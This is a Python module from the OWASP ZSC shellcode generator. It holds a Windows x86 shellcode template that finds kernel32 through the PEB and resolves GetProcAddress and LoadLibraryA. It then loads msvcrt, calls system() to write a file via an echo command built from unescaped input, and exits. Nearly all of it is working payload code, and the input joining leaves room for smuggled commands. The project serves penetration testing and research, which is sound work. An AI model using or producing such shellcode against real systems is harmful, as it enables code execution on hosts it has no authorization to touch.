#!/usr/bin/env python
'''
OWASP ZSC
https://www.owasp.org/index.php/OWASP_ZSC_Tool_Project
https://github.com/zscproject/OWASP-ZSC
http://api.z3r0d4y.com/
https://groups.google.com/d/forum/owasp-zsc [ owasp-zsc[at]googlegroups[dot]com ]
'''
from core import stack


def create_file(create_command):
    return '''
xor    %ecx,%ecx
mov    %fs:0x30(%ecx),%eax
mov    0xc(%eax),%eax
mov    0x14(%eax),%esi
lods   %ds:(%esi),%eax
xchg   %eax,%esi
lods   %ds:(%esi),%eax
mov    0x10(%eax),%ebx
mov    0x3c(%ebx),%edx
add    %ebx,%edx
mov    0x78(%edx),%edx
add    %ebx,%edx
mov    0x20(%edx),%esi
add    %ebx,%esi
xor    %ecx,%ecx
inc    %ecx
lods   %ds:(%esi),%eax
add    %ebx,%eax
cmpl   $0x50746547,(%eax)
jne    23 <.text+0x23>
cmpl   $0x41636f72,0x4(%eax)
jne    23 <.text+0x23>
cmpl   $0x65726464,0x8(%eax)
jne    23 <.text+0x23>
mov    0x24(%edx),%esi
add    %ebx,%esi
mov    (%esi,%ecx,2),%cx
dec    %ecx
mov    0x1c(%edx),%esi
add    %ebx,%esi
mov    (%esi,%ecx,4),%edx
add    %ebx,%edx
xor    %esi,%esi
mov    %edx,%esi
xor    %ecx,%ecx
push   %ecx
push   $0x41797261
push   $0x7262694c
push   $0x64616f4c
push   %esp
push   %ebx
call   *%edx
xor    %ecx,%ecx
mov    $0x6c6c,%cx
push   %ecx
push   $0x642e7472
push   $0x6376736d
push   %esp
call   *%eax
xor    %edi,%edi
mov    %eax,%edi
xor    %edx,%edx
push   %edx
mov    $0x6d65,%dx
push   %edx
push   $0x74737973
mov    %esp,%ecx
push   %ecx
push   %edi
xor    %edx,%edx
mov    %esi,%edx
call   *%edx
xor    %ecx,%ecx
{0}
push   %esp
call   *%eax
xor    %edx,%edx
push   %edx
push   $0x74697865
mov    %esp,%ecx
push   %ecx
push   %edi
call   *%esi
xor    %ecx,%ecx
push   %ecx
call   *%eax
'''.format(create_command)


def run(data):
    file_to_create = data[0]
    file_content = data[1]
    return create_file(stack.generate("echo " + file_content + ">" +
                                      file_to_create, "%ecx", "string"))
